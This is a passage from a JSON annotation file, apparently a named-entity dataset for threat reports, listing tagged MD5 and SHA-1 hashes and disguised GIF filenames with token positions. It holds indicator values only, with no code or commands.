"sent_id": 33, "type": "MD5"}], [{"name": "92a2c993b7a1849f11e8a95defacd2f7", "pos": [1, 2], "sent_id": 33, "type": "MD5"}], [{"name": "297ef5bf99b5e4fd413f3755ba6aad79", "pos": [0, 1], "sent_id": 34, "type": "MD5"}], [{"name": "06def6c642dcbd58d0291ac110a57274", "pos": [1, 2], "sent_id": 34, "type": "MD5"}], [{"name": "2679e112f908fbf4ac96d87f7fdc46ca", "pos": [0, 1], "sent_id": 35, "type": "MD5"}], [{"name": "afe0190820b3edc296daefe6d1611051", "pos": [1, 2], "sent_id": 35, "type": "MD5"}], [{"name": "e196fa056d1a728d9ba9654fbc482777", "pos": [2, 3], "sent_id": 35, "type": "MD5"}], [{"name": "7049aa581874752093bb98850ff45dac", "pos": [3, 4], "sent_id": 35, "type": "MD5"}], [{"name": "441ee6a307e672c24d334d66cd7b2e1a", "pos": [4, 5], "sent_id": 35, "type": "MD5"}], [{"name": "e975e87bec844c882bf6d60604fc996b", "pos": [5, 6], "sent_id": 35, "type": "MD5"}], [{"name": "a58e8e935341b6f5cc1369c616de3765", "pos": [6, 7], "sent_id": 35, "type": "MD5"}], [{"name": "0a2da3c2c6b94c925459bc5e32bbb03c", "pos": [0, 1], "sent_id": 36, "type": "MD5"}], [{"name": "d2f39019bfa05c7e71748d0624be9a94", "pos": [1, 2], "sent_id": 36, "type": "MD5"}], [{"name": "0a5c9055c2b35bee78c911dfc29fe1a4", "pos": [2, 3], "sent_id": 36, "type": "MD5"}], [{"name": "ecd349138a6ef7d7ca40b9ce70dbb575", "pos": [3, 4], "sent_id": 36, "type": "MD5"}], [{"name": "21f16767e53da7fef8a1b5d4159256a9", "pos": [0, 1], "sent_id": 37, "type": "MD5"}], [{"name": "935892bb70d954efdc5ee1b0c5f97184", "pos": [0, 1], "sent_id": 38, "type": "MD5"}], [{"name": "bba6b0d31553cd8df0c45b85c0495816", "pos": [1, 2], "sent_id": 38, "type": "MD5"}], [{"name": "48bbce47e4d2d51811ea99d5a771cd1a", "pos": [2, 3], "sent_id": 38, "type": "MD5"}], [{"name": "b47b36484cfb0ab38ef481e23275fafb", "pos": [0, 1], "sent_id": 39, "type": "MD5"}], [{"name": "b68677e04fcc9103560bb0a5e5c7303f", "pos": [1, 2], "sent_id": 39, "type": "MD5"}], [{"name": "5e757aa35087ca7c479c82d0d5502f51", "pos": [2, 3], "sent_id": 39, "type": "MD5"}], [{"name": "27212d5e5d40a5e5c1742aac58dc59a8", "pos": [3, 4], "sent_id": 39, "type": "MD5"}], [{"name": "4193796cffa19e2e5cace58e9f10c599", "pos": [4, 5], "sent_id": 39, "type": "MD5"}], [{"name": "aab06d4ab78336b7315201637d9f1b0e", "pos": [5, 6], "sent_id": 39, "type": "MD5"}], [{"name": "474fa3c28d867f7113c060020b3e268b", "pos": [6, 7], "sent_id": 39, "type": "MD5"}], [{"name": "05d10323111f02233163a6742556c974", "pos": [7, 8], "sent_id": 39, "type": "MD5"}], [{"name": "f0b327565c25128ad15f9c378bc4ea60", "pos": [0, 1], "sent_id": 40, "type": "MD5"}], [{"name": "d9b68522053396644bcb72448d6cf327", "pos": [1, 2], "sent_id": 40, "type": "MD5"}], [{"name": "af906032917674f1f39a260b2b9fe0fb", "pos": [2, 3], "sent_id": 40, "type": "MD5"}], [{"name": "6507f6b1e2ce05dccf329b8cab078071", "pos": [3, 4], "sent_id": 40, "type": "MD5"}], [{"name": "633b59e7b97ef4574804ca35669fbf95", "pos": [0, 1], "sent_id": 41, "type": "MD5"}], [{"name": "b100d530d67cfbe76394bb0160567382", "pos": [0, 1], "sent_id": 42, "type": "MD5"}], [{"name": "203a6ff36ee2cd58daf5680b5a6890ec", "pos": [1, 2], "sent_id": 42, "type": "MD5"}], [{"name": "2d552b20e8164f3d4250fd8871b11b0f", "pos": [0, 1], "sent_id": 43, "type": "MD5"}], [{"name": "877a34931b087d04d387633824d9c813", "pos": [1, 2], "sent_id": 43, "type": "MD5"}], [{"name": "e990e0d1ee90cd10c4be7bfde6cc3e5a", "pos": [0, 1], "sent_id": 44, "type": "MD5"}], [{"name": "c8373db89be0a155673e0cd414442fc1", "pos": [1, 2], "sent_id": 44, "type": "MD5"}], [{"name": "8233c532bfcc4ccf2831765eae084409", "pos": [2, 3], "sent_id": 44, "type": "MD5"}], [{"name": "bg_aefk.gif", "pos": [3, 4], "sent_id": 44, "type": "File"}], [{"name": "bg_aefk.gif.dec", "pos": [4, 5], "sent_id": 44, "type": "File"}], [{"name": "bg_afvd.gif", "pos": [5, 6], "sent_id": 44, "type": "File"}], [{"name": "bg_afvd.gif.dec", "pos": [6, 7], "sent_id": 44, "type": "File"}], [{"name": "bg_dafd.gif", "pos": [7, 8], "sent_id": 44, "type": "File"}], [{"name": "bg_dafd.gif.dec", "pos": [8, 9], "sent_id": 44, "type": "File"}], [{"name": "bg_dasfs.gif", "pos": [9, 10], "sent_id": 44, "type": "File"}], [{"name": "bg_dasfs.gif.dec", "pos": [10, 11], "sent_id": 44, "type": "File"}], [{"name": "bg_dfdsh.gif", "pos": [11, 12], "sent_id": 44, "type": "File"}], [{"name": "bg_dfdsh.gif.dec", "pos": [12, 13], "sent_id": 44, "type": "File"}], [{"name": "bg_dfell.gif", "pos": [13, 14], "sent_id": 44, "type": "File"}], [{"name": "bg_dfell.gif.dec", "pos": [14, 15], "sent_id": 44, "type": "File"}], [{"name": "bg_dfesik.gif", "pos": [15, 16], "sent_id": 44, "type": "File"}], [{"name": "bg_dfesik.gif.dec", "pos": [16, 17], "sent_id": 44, "type": "File"}], [{"name": "bg_dfeu.gif", "pos": [17, 18], "sent_id": 44, "type": "File"}], [{"name": "bg_dfeu.gif.dec", "pos": [18, 19], "sent_id": 44, "type": "File"}], [{"name": "bg_dfew.gif", "pos": [19, 20], "sent_id": 44, "type": "File"}], [{"name": "bg_dfew.gif.dec", "pos": [20, 21], "sent_id": 44, "type": "File"}], [{"name": "bg_dfews.gif", "pos": [21, 22], "sent_id": 44, "type": "File"}], [{"name": "bg_dfews.gif.dec", "pos": [22, 23], "sent_id": 44, "type": "File"}], [{"name": "bg_dflj.gif", "pos": [23, 24], "sent_id": 44, "type": "File"}], [{"name": "bg_dflj.gif.dec", "pos": [24, 25], "sent_id": 44, "type": "File"}], [{"name": "bg_dfoiu.gif", "pos": [25, 26], "sent_id": 44, "type": "File"}], [{"name": "bg_dfoiu.gif.dec", "pos": [26, 27], "sent_id": 44, "type": "File"}], [{"name": "bg_dfrio.gif", "pos": [27, 28], "sent_id": 44, "type": "File"}], [{"name": "bg_dfrio.gif.dec", "pos": [28, 29], "sent_id": 44, "type": "File"}], [{"name": "bg_dfwe.gif", "pos": [29, 30], "sent_id": 44, "type": "File"}], [{"name": "bg_dfwe.gif.dec", "pos": [30, 31], "sent_id": 44, "type": "File"}], [{"name": "bg_dsaf.gif", "pos": [31, 32], "sent_id": 44, "type": "File"}], [{"name": "bg_dsaf.gif.dec", "pos": [32, 33], "sent_id": 44, "type": "File"}], [{"name": "bg_dsaffe.gif", "pos": [33, 34], "sent_id": 44, "type": "File"}], [{"name": "bg_dsaffe.gif.dec", "pos": [34, 35], "sent_id": 44, "type": "File"}], [{"name": "bg_dsef.gif", "pos": [35, 36], "sent_id": 44, "type": "File"}], [{"name": "bg_dsef.gif.dec", "pos": [36, 37], "sent_id": 44, "type": "File"}], [{"name": "bg_dsert.gif", "pos": [37, 38], "sent_id": 44, "type": "File"}], [{"name": "bg_dsert.gif.dec", "pos": [38, 39], "sent_id": 44, "type": "File"}], [{"name": "bg_dwed.gif", "pos": [39, 40], "sent_id": 44, "type": "File"}], [{"name": "bg_dwed.gif.dec", "pos": [40, 41], "sent_id": 44, "type": "File"}], [{"name": "bg_edf.gif", "pos": [41, 42], "sent_id": 44, "type": "File"}], [{"name": "bg_edf.gif.dec", "pos": [42, 43], "sent_id": 44, "type": "File"}], [{"name": "d39f2202b421561cfc36a8802184685c", "pos": [43, 44], "sent_id": 44, "type": "MD5"}], [{"name": "2d87ab160291664d62445548a2164c60", "pos": [44, 45], "sent_id": 44, "type": "MD5"}], [{"name": "e37d7cc17070df4917f194968073e14b", "pos": [45, 46], "sent_id": 44, "type": "MD5"}], [{"name": "fdc96d77af6fdae487002e32d61df123", "pos": [46, 47], "sent_id": 44, "type": "MD5"}], [{"name": "f80af1246744f8eedae152dc44ebfc51", "pos": [47, 48], "sent_id": 44, "type": "MD5"}], [{"name": "2dcd049c591644e35102921a48799975", "pos": [48, 49], "sent_id": 44, "type": "MD5"}], [{"name": "7aef3a8776c7a58ef01542ff7d4c83e8", "pos": [0, 1], "sent_id": 45, "type": "MD5"}], [{"name": "b540a9f81f538f4f324db422e7bb4559", "pos": [1, 2], "sent_id": 45, "type": "MD5"}], [{"name": "ed67c4aca1d25d1083bb8ba65573a4a9", "pos": [0, 1], "sent_id": 46, "type": "MD5"}], [{"name": "1528567b1a2f1da31d602ce1ddfd8918", "pos": [1, 2], "sent_id": 46, "type": "MD5"}], [{"name": "bedb8231a7b0d8b13a53e7e1fdff04dd", "pos": [2, 3], "sent_id": 46, "type": "MD5"}], [{"name": "7056df132f448d45b4781c2ddc27b113", "pos": [3, 4], "sent_id": 46, "type": "MD5"}], [{"name": "d469a7d7750c964419c0aaa0347c7a9c", "pos": [4, 5], "sent_id": 46, "type": "MD5"}], [{"name": "d27c2cce5ceb8a62c766a2ae4d50730e", "pos": [5, 6], "sent_id": 46, "type": "MD5"}], [{"name": "5add9bb805c8956931739308369b2c45", "pos": [0, 1], "sent_id": 47, "type": "MD5"}], [{"name": "1e0c1f4271c5cadcad7b66bef5863b83", "pos": [1, 2], "sent_id": 47, "type": "MD5"}], [{"name": "4c3664dce0b336f4262b5ec1374f9690", "pos": [2, 3], "sent_id": 47, "type": "MD5"}], [{"name": "ab2d8a0d5b03d40f148f2f907b55f9f1", "pos": [3, 4], "sent_id": 47, "type": "MD5"}], [{"name": "113e5ab47e1efae97fd7641276055984", "pos": [4, 5], "sent_id": 47, "type": "MD5"}], [{"name": "2f3fd599020fa857d28fe3e2bb26c6ca", "pos": [0, 1], "sent_id": 48, "type": "MD5"}], [{"name": "55b25ccb549df610c34072556abf88fa", "pos": [1, 2], "sent_id": 48, "type": "MD5"}], [{"name": "fd85ca2a0da6b7b7c93e1ad0efa25c4c", "pos": [2, 3], "sent_id": 48, "type": "MD5"}], [{"name": "b248d1b0ee26cb4393efe4ffab0c8c91", "pos": [3, 4], "sent_id": 48, "type": "MD5"}], [{"name": "1667a3a01b906b1e47328ad601d68d1e", "pos": [4, 5], "sent_id": 48, "type": "MD5"}], [{"name": "f7ed059147802b503f1792694a167e74", "pos": [5, 6], "sent_id": 48, "type": "MD5"}], [{"name": "c92252487615d5379317febc22dba7d4", "pos": [6, 7], "sent_id": 48, "type": "MD5"}], [{"name": "34f62a12bc36fd119734a322ef666f14", "pos": [7, 8], "sent_id": 48, "type": "MD5"}], [{"name": "efb1246ee89798a2d9182ad9bbcbb41a", "pos": [8, 9], "sent_id": 48, "type": "MD5"}], [{"name": "85388d2adf7b8608f1d3468b4e07920d", "pos": [9, 10], "sent_id": 48, "type": "MD5"}], [{"name": "7829cb4ca55fcda8928e0f63ee86c6c2", "pos": [0, 1], "sent_id": 49, "type": "MD5"}], [{"name": "882957f0845d54d83cd0389264d9ba8f", "pos": [1, 2], "sent_id": 49, "type": "MD5"}], [{"name": "c519eef57001ad3ae60cdcb0009bf778", "pos": [0, 1], "sent_id": 50, "type": "MD5"}], [{"name": "5935bc0845e6b192c163fc77ee3c00bf", "pos": [0, 1], "sent_id": 51, "type": "MD5"}], [{"name": "381691b297f7f5694709e21ad61ec645", "pos": [0, 1], "sent_id": 52, "type": "MD5"}], [{"name": "cfb4e25bd9dbf5afef6a56d468de91a1", "pos": [1, 2], "sent_id": 52, "type": "MD5"}], [{"name": "c8d75ed7835fdb543200298216d1d0f4", "pos": [2, 3], "sent_id": 52, "type": "MD5"}], [{"name": "cde0900f94c4c360540735028d6be71c", "pos": [3, 4], "sent_id": 52, "type": "MD5"}], [{"name": "aa48cb8e26ecdf16f22b0585a5fd96bf", "pos": [4, 5], "sent_id": 52, "type": "MD5"}], [{"name": "e498ef07eba70804e90aa303cbd4c20b", "pos": [0, 1], "sent_id": 53, "type": "MD5"}], [{"name": "798bea2f1e2e6fc8edcedea548877aa2", "pos": [0, 1], "sent_id": 54, "type": "MD5"}], [{"name": "78cca6a7d4aed656c9683aeb18732e95", "pos": [1, 2], "sent_id": 54, "type": "MD5"}], [{"name": "241363e7641cfa7d9063013ed44bf87b", "pos": [0, 1], "sent_id": 55, "type": "MD5"}], [{"name": "7f77c4839d09cdf930b021cbdd89410e", "pos": [1, 2], "sent_id": 55, "type": "MD5"}], [{"name": "b8e89f9908262b5385623c0e39d6b940", "pos": [2, 3], "sent_id": 55, "type": "MD5"}], [{"name": "e2019b16e587ef1d3e05df164a01101c", "pos": [3, 4], "sent_id": 55, "type": "MD5"}], [{"name": "3649fc6e3222721826485131142846b4", "pos": [4, 5], "sent_id": 55, "type": "MD5"}], [{"name": "4fbe44c36d6c1a2b74733c1cd0d34cbf", "pos": [5, 6], "sent_id": 55, "type": "MD5"}], [{"name": "1051aeace46a4bd33d0167cacd42b12b", "pos": [6, 7], "sent_id": 55, "type": "MD5"}], [{"name": "0e02b78673a9cf2db7a0cc5b00e306e9", "pos": [7, 8], "sent_id": 55, "type": "MD5"}], [{"name": "3c188004c98934beaafa7a52ee397f90", "pos": [0, 1], "sent_id": 56, "type": "MD5"}], [{"name": "2bd1572913eed832451b768c6c4c610c", "pos": [1, 2], "sent_id": 56, "type": "MD5"}], [{"name": "089b3f42a96f4f74b05e858cdf8db3fc", "pos": [2, 3], "sent_id": 56, "type": "MD5"}], [{"name": "58cf3b1adb7981938848c018d2e52ecb", "pos": [3, 4], "sent_id": 56, "type": "MD5"}], [{"name": "014030329695cabdb9966a3006eae07a", "pos": [4, 5], "sent_id": 56, "type": "MD5"}], [{"name": "7ae8ac5de85b0777868281f64237197c", "pos": [0, 1], "sent_id": 57, "type": "MD5"}], [{"name": "b8088f6594dd8cba31b4f52a2d91f40e", "pos": [1, 2], "sent_id": 57, "type": "MD5"}], [{"name": "b24f414809671328ced9cec73ff5ca3a", "pos": [2, 3], "sent_id": 57, "type": "MD5"}], [{"name": "6dca5669aad4933b0629571ce6c99998", "pos": [3, 4], "sent_id": 57, "type": "MD5"}], [{"name": "cf1e3f0b0d3a9e009bea821b4bffa387", "pos": [4, 5], "sent_id": 57, "type": "MD5"}], [{"name": "bg_edf_v2.gif", "pos": [5, 6], "sent_id": 57, "type": "File"}], [{"name": "bg_edf_v2.gif.dec", "pos": [6, 7], "sent_id": 57, "type": "File"}], [{"name": "bg_edfsa.gif", "pos": [7, 8], "sent_id": 57, "type": "File"}], [{"name": "bg_edfsa.gif.dec", "pos": [8, 9], "sent_id": 57, "type": "File"}], [{"name": "bg_edse.gif", "pos": [9, 10], "sent_id": 57, "type": "File"}], [{"name": "bg_edse.gif.dec", "pos": [10, 11], "sent_id": 57, "type": "File"}], [{"name": "bg_eefds.gif", "pos": [11, 12], "sent_id": 57, "type": "File"}], [{"name": "bg_eefds.gif.dec", "pos": [12, 13], "sent_id": 57, "type": "File"}], [{"name": "bg_efd.gif", "pos": [13, 14], "sent_id": 57, "type": "File"}], [{"name": "bg_efd.gif.dec", "pos": [14, 15], "sent_id": 57, "type": "File"}], [{"name": "bg_efdse.gif", "pos": [15, 16], "sent_id": 57, "type": "File"}], [{"name": "bg_efdse.gif.dec", "pos": [16, 17], "sent_id": 57, "type": "File"}], [{"name": "bg_efed.gif", "pos": [17, 18], "sent_id": 57, "type": "File"}], [{"name": "bg_efed.gif.dec", "pos": [18, 19], "sent_id": 57, "type": "File"}], [{"name": "bg_efwe.gif", "pos": [19, 20], "sent_id": 57, "type": "File"}], [{"name": "bg_efwe.gif.dec", "pos": [20, 21], "sent_id": 57, "type": "File"}], [{"name": "bg_ekjf.gif", "pos": [21, 22], "sent_id": 57, "type": "File"}], [{"name": "bg_ekjf.gif.dec", "pos": [22, 23], "sent_id": 57, "type": "File"}], [{"name": "bg_ekks.gif", "pos": [23, 24], "sent_id": 57, "type": "File"}], [{"name": "bg_ekks.gif.dec", "pos": [24, 25], "sent_id": 57, "type": "File"}], [{"name": "bg_elfj.gif", "pos": [25, 26], "sent_id": 57, "type": "File"}], [{"name": "bg_elfj.gif.dec", "pos": [26, 27], "sent_id": 57, "type": "File"}], [{"name": "bg_elj.gif", "pos": [27, 28], "sent_id": 57, "type": "File"}], [{"name": "bg_elj.gif.dec", "pos": [28, 29], "sent_id": 57, "type": "File"}], [{"name": "bg_esd.gif", "pos": [29, 30], "sent_id": 57, "type": "File"}], [{"name": "bg_esd.gif.dec", "pos": [30, 31], "sent_id": 57, "type": "File"}], [{"name": "bg_ewfed.gif", "pos": [31, 32], "sent_id": 57, "type": "File"}], [{"name": "bg_ewfed.gif.dec", "pos": [32, 33], "sent_id": 57, "type": "File"}], [{"name": "bg_ewwe.gif", "pos": [33, 34], "sent_id": 57, "type": "File"}], [{"name": "bg_ewwe.gif.dec", "pos": [34, 35], "sent_id": 57, "type": "File"}], [{"name": "bg_fdfe.gif", "pos": [35, 36], "sent_id": 57, "type": "File"}], [{"name": "bg_fdfe.gif.dec", "pos": [36, 37], "sent_id": 57, "type": "File"}], [{"name": "bg_fed.gif", "pos": [37, 38], "sent_id": 57, "type": "File"}], [{"name": "bg_fed.gif.dec", "pos": [38, 39], "sent_id": 57, "type": "File"}], [{"name": "bg_fefsf.gif", "pos": [39, 40], "sent_id": 57, "type": "File"}], [{"name": "bg_fefsf.gif.dec", "pos": [40, 41], "sent_id": 57, "type": "File"}], [{"name": "bg_fked.gif", "pos": [41, 42], "sent_id": 57, "type": "File"}], [{"name": "bg_fked.gif.dec", "pos": [42, 43], "sent_id": 57, "type": "File"}], [{"name": "bg_fwds.gif", "pos": [43, 44], "sent_id": 57, "type": "File"}], [{"name": "bg_fwds.gif.dec", "pos": [44, 45], "sent_id": 57, "type": "File"}], [{"name": "bg_kefs.gif", "pos": [45, 46], "sent_id": 57, "type": "File"}], [{"name": "bg_kefs.gif.dec", "pos": [46, 47], "sent_id": 57, "type": "File"}], [{"name": "bg_kei.gif", "pos": [47, 48], "sent_id": 57, "type": "File"}], [{"name": "bg_kei.gif.dec", "pos": [0, 1], "sent_id": 58, "type": "File"}], [{"name": "bg_keio.gif", "pos": [0, 1], "sent_id": 59, "type": "File"}], [{"name": "bg_keio.gif.dec", "pos": [1, 2], "sent_id": 59, "type": "File"}], [{"name": "bg_kje.gif", "pos": [0, 1], "sent_id": 60, "type": "File"}], [{"name": "bg_kje.gif.dec", "pos": [1, 2], "sent_id": 60, "type": "File"}], [{"name": "bg_kkf.gif", "pos": [2, 3], "sent_id": 60, "type": "File"}], [{"name": "bg_kkf.gif.dec", "pos": [3, 4], "sent_id": 60, "type": "File"}], [{"name": "bg_koe.gif", "pos": [4, 5], "sent_id": 60, "type": "File"}], [{"name": "bg_koe.gif.dec", "pos": [0, 1], "sent_id": 61, "type": "File"}], [{"name": "bg_ldfe.gif", "pos": [1, 2], "sent_id": 61, "type": "File"}], [{"name": "bg_ldfe.gif.dec", "pos": [2, 3], "sent_id": 61, "type": "File"}], [{"name": "bg_leo.gif", "pos": [3, 4], "sent_id": 61, "type": "File"}], [{"name": "bg_leo.gif.dec", "pos": [0, 1], "sent_id": 62, "type": "File"}], [{"name": "bg_lfe.gif", "pos": [1, 2], "sent_id": 62, "type": "File"}], [{"name": "bg_lfe.gif.dec", "pos": [2, 3], "sent_id": 62, "type": "File"}], [{"name": "bg_lkje.gif", "pos": [3, 4], "sent_id": 62, "type": "File"}], [{"name": "22036375458057994e5fa81474393465", "pos": [4, 5], "sent_id": 62, "type": "MD5"}], [{"name": "cffd063dacff1830de63c833e89facc1", "pos": [5, 6], "sent_id": 62, "type": "MD5"}], [{"name": "168f3d5a88f695c157446549e4770dd9", "pos": [0, 1], "sent_id": 63, "type": "MD5"}], [{"name": "ffd8ab9d37519ffa15a86157422a6517", "pos": [0, 1], "sent_id": 64, "type": "MD5"}], [{"name": "8282eb6d6f20c5de6e7f4ae3a42438d2", "pos": [1, 2], "sent_id": 64, "type": "MD5"}], [{"name": "fed5e99509537e0f46a6e7ab4f9f3587", "pos": [2, 3], "sent_id": 64, "type": "MD5"}], [{"name": "aaa1633a0b8108763334bbcd590848d1", "pos": [3, 4], "sent_id": 64, "type": "MD5"}], [{"name": "5b0f68e23817494f52c84e8e38c6a30d", "pos": [0, 1], "sent_id": 65, "type": "MD5"}], [{"name": "ffefe16d581340c1e49f585a576a1fd8", "pos": [0, 1], "sent_id": 66, "type": "MD5"}], [{"name": "492134baaf2059bdb799c9c7483d1926", "pos": [1, 2], "sent_id": 66, "type": "MD5"}], [{"name": "a67ad3e2a020f690d892b727102a759b", "pos": [2, 3], "sent_id": 66, "type": "MD5"}], [{"name": "b664ce0888cdf5180813be0cfcfcf8ee", "pos": [0, 1], "sent_id": 67, "type": "MD5"}], [{"name": "687a596db9031b38f23064d45c0a4ddb", "pos": [1, 2], "sent_id": 67, "type": "MD5"}], [{"name": "8e4505e28766ab08db27ca91e5ecc839", "pos": [2, 3], "sent_id": 67, "type": "MD5"}], [{"name": "04d5e76049db2c1e799e70231107339a", "pos": [3, 4], "sent_id": 67, "type": "MD5"}], [{"name": "00457691525bf21484827bcd8a01828b", "pos": [4, 5], "sent_id": 67, "type": "MD5"}], [{"name": "e1a659473ae1e828508309b77da13783", "pos": [0, 1], "sent_id": 68, "type": "MD5"}], [{"name": "1a1afc3d26c82c4b0facf5ca8a5dcb36", "pos": [0, 1], "sent_id": 69, "type": "MD5"}], [{"name": "f648bd9d68bd016739988bb71bf5486b", "pos": [1, 2], "sent_id": 69, "type": "MD5"}], [{"name": "42ccad0b47cb1836e7e09869b41ebdb2", "pos": [2, 3], "sent_id": 69, "type": "MD5"}], [{"name": "8ee3cf5e37480ee1324146feef30de02", "pos": [3, 4], "sent_id": 69, "type": "MD5"}], [{"name": "796f0698644f61fdcd7da04bf590544e", "pos": [4, 5], "sent_id": 69, "type": "MD5"}], [{"name": "2ab25d33d61cf4cfbac92c26c7c0598e", "pos": [5, 6], "sent_id": 69, "type": "MD5"}], [{"name": "0b02262772b8c2c5e54dae99bdb07029", "pos": [0, 1], "sent_id": 70, "type": "MD5"}], [{"name": "728f9c1d9dd0635a4b205f2d4d68a887", "pos": [1, 2], "sent_id": 70, "type": "MD5"}], [{"name": "95694878bba2e099ea9ca1b5deeedb7a", "pos": [2, 3], "sent_id": 70, "type": "MD5"}], [{"name": "f19345e0e5aecc0da45b4c110591bdd9", "pos": [3, 4], "sent_id": 70, "type": "MD5"}], [{"name": "bg_lkje.gif.dec", "pos": [4, 5], "sent_id": 70, "type": "File"}], [{"name": "bg_lkjkef.gif", "pos": [5, 6], "sent_id": 70, "type": "File"}], [{"name": "bg_lkjkef.gif.dec", "pos": [6, 7], "sent_id": 70, "type": "File"}], [{"name": "bg_oef.gif", "pos": [7, 8], "sent_id": 70, "type": "File"}], [{"name": "bg_oef.gif.dec", "pos": [8, 9], "sent_id": 70, "type": "File"}], [{"name": "bg_ojlro.gif", "pos": [9, 10], "sent_id": 70, "type": "File"}], [{"name": "bg_ojlro.gif.dec", "pos": [10, 11], "sent_id": 70, "type": "File"}], [{"name": "bg_qdf.gif", "pos": [11, 12], "sent_id": 70, "type": "File"}], [{"name": "bg_qdf.gif.dec", "pos": [12, 13], "sent_id": 70, "type": "File"}], [{"name": "bg_qrg.gif", "pos": [13, 14], "sent_id": 70, "type": "File"}], [{"name": "bg_qrg.gif.dec", "pos": [14, 15], "sent_id": 70, "type": "File"}], [{"name": "bg_rie.gif", "pos": [15, 16], "sent_id": 70, "type": "File"}], [{"name": "bg_rie.gif.dec", "pos": [16, 17], "sent_id": 70, "type": "File"}], [{"name": "bg_ruie.gif", "pos": [17, 18], "sent_id": 70, "type": "File"}], [{"name": "bg_ruie.gif.dec", "pos": [18, 19], "sent_id": 70, "type": "File"}], [{"name": "bg_sasd.gif", "pos": [19, 20], "sent_id": 70, "type": "File"}], [{"name": "bg_sasd.gif.dec", "pos": [20, 21], "sent_id": 70, "type": "File"}], [{"name": "bg_sdef.gif", "pos": [21, 22], "sent_id": 70, "type": "File"}], [{"name": "bg_sdef.gif.dec", "pos": [22, 23], "sent_id": 70, "type": "File"}], [{"name": "bg_sdefk.gif", "pos": [23, 24], "sent_id": 70, "type": "File"}], [{"name": "bg_sdefk.gif.dec", "pos": [24, 25], "sent_id": 70, "type": "File"}], [{"name": "bg_sfef.gif", "pos": [25, 26], "sent_id": 70, "type": "File"}], [{"name": "bg_sfef.gif.dec", "pos": [26, 27], "sent_id": 70, "type": "File"}], [{"name": "bg_ureio.gif", "pos": [27, 28], "sent_id": 70, "type": "File"}], [{"name": "bg_ureio.gif.dec", "pos": [28, 29], "sent_id": 70, "type": "File"}], [{"name": "bg_wdf.gif", "pos": [29, 30], "sent_id": 70, "type": "File"}], [{"name": "bg_wdf.gif.dec", "pos": [0, 1], "sent_id": 71, "type": "File"}], [{"name": "8d7e8b7871b634ad67b13e55aebb7fb7a954ff90", "pos": [0, 1], "sent_id": 72, "type": "SHA-1"}], [{"name": "1e6b9414fce4277207aab2aa12e4f0842a23f9c1", "pos": [1, 2], "sent_id": 72, "type": "SHA-1"}], [{"name": "ed64fba3195f52192c65cad491a28bf18f6f67a3", "pos": [2, 3], "sent_id": 72, "type": "SHA-1"}], [{"name": "28a43eac3be1b96c68a1e7463ae91367434a2ac4", "pos": [3, 4], "sent_id": 72, "type": "SHA-1"}], [{"name": "cc492d4b188f4cf5003f8b6954f6dd071a8066c2", "pos": [4, 5], "sent_id": 72, "type": "SHA-1"}], [{"name": "97a374bac7572d44ca8c73c49d3d6ddeade90e34", "pos": [5, 6], "sent_id": 72, "type": "SHA-1"}], [{"name": "81612fc09cfae280cc35b1331c832a5a87c2edff", "pos": [6, 7], "sent_id": 72, "type": "SHA-1"}], [{"name": "b32b675699a59b4272a956dbd81738d02d4ca8a4", "pos": [7, 8], "sent_id": 72, "type": "SHA-1"}], [{"name": "352a2cf4bb2c9e300ce9a51740f238c9282ca6e4", "pos": [8, 9], "sent_id": 72, "type": "SHA-1"}], [{"name": "2ceae0f5f3efe366ebded0a413e5ea264fbf2a33", "pos": [9, 10], "sent_id": 72, "type": "SHA-1"}], [{"name": "05c539ca5dfbfab8e61ffab4b7b13ba2a5e7154c", "pos": [10, 11], "sent_id": 72, "type": "SHA-1"}], [{"name": "ad9734b05973a0a0f1d34a32cd1936e66898c034", "pos": [11, 12], "sent_id": 72, "type": "SHA-1"}], [{"name": "f3c6c0c73dcccbf44521763985bbf1ad6e3317eb", "pos": [0, 1], "sent_id": 73, "type": "SHA-1"}], [{"name": "a9e529c7b04a99019dd31c3c0d7f576e1bbd0970", "pos": [1, 2], "sent_id": 73, "type": "SHA-1"}], [{"name": "5e33dd2fcf0c32d3fc458b2d99a0033461c3a6ea", "pos": [0, 1], "sent_id": 74, "type": "SHA-1"}], [{"name": "69d95479d520e016ce733541ec815aafe16ead04", "pos": [1, 2], "sent_id": 74, "type": "SHA-1"}], [{"name": "b995e16fc3a981d693778e370e5ba19861412db6", "pos": [2, 3], "sent_id": 74, "type": "SHA-1"}], [{"name": "efcb9be7bf162980187237bcb50f4da2d55430c2", "pos": [3, 4], "sent_id": 74, "type": "SHA-1"}], [{"name": "39952ab95453de127a6a61f4e67c3109ca8ff93e", "pos": [4, 5], "sent_id": 74, "type": "SHA-1"}], [{"name": "1ba5bcd62abcbff517a4adb2609f721dd7f609df", "pos": [5, 6], "sent_id": 74, "type": "SHA-1"}], [{"name": "a9e9cd4b2b1ec4efcdbce79b582f874cebe3ebd1", "pos": [0, 1], "sent_id": 75, "type": "SHA-1"}], [{"name": "a6c18fcbe6b25c370e1305d523b5de662172875b", "pos": [1, 2], "sent_id": 75, "type": "SHA-1"}], [{"name": "5cb2d1005caccbe451f2bd2c6314283ba04a7401", "pos": [2, 3], "sent_id": 75, "type": "SHA-1"}], [{"name": "d99ddb6c4fc13f97c6a77f84ba31533ca2e1d9e0", "pos": [3, 4], "sent_id": 75, "type": "SHA-1"}], [{"name": "d4c10e9248392936cf94a168a792d4b9942398a8", "pos": [0, 1], "sent_id": 76, "type": "SHA-1"}], [{"name": "832d80c16886a7529aa22c962a00a7bb3fe1ff77", "pos": [1, 2], "sent_id": 76, "type": "SHA-1"}], [{"name": "78e20444a96f4405aae2a26e1a013634c81d7328", "pos": [2, 3], "sent_id": 76, "type": "SHA-1"}], [{"name": "4ec769c15a9e318d41fd4a1997ec13c029976fc2", "pos": [30, 31], "sent_id": 76, "type": "SHA-1"}], [{"name": "1f07d80b16a539cc6d7fccd2bb37ddaaf734352e", "pos": [31, 32], "sent_id": 76, "type": "SHA-1"}], [{"name": "f762ff3801d1e4ad1360d50e54f2894211cd8958", "pos": [0, 1], "sent_id": 77, "type": "SHA-1"}], [{"name": "be9aa1776fbd5b05fea230ff77654e8a9d29a802", "pos": [0, 1], "sent_id": 78, "type": "SHA-1"}], [{"name": "8da1aca62c3a19ac0f9b85fb48b711e6b946bc77", "pos": [0, 1], "sent_id": 79, "type": "SHA-1"}], [{"name": "b524a190d74a1b8824a049936e17aee714f5bd23", "pos": [0, 1], "sent_id": 80, "type": "SHA-1"}], [{"name": "43fa0d5a30b4cd72bb7e156c00c1611bb4f4bd0a", "pos": [0, 1], "sent_id": 81, "type": "SHA-1"}], [{"name": "4213387b4e4cf0bb2499b06b4fecd90af7d7257a", "pos": [1, 2], "sent_id": 81, "type": "SHA-1"}], [{"name": 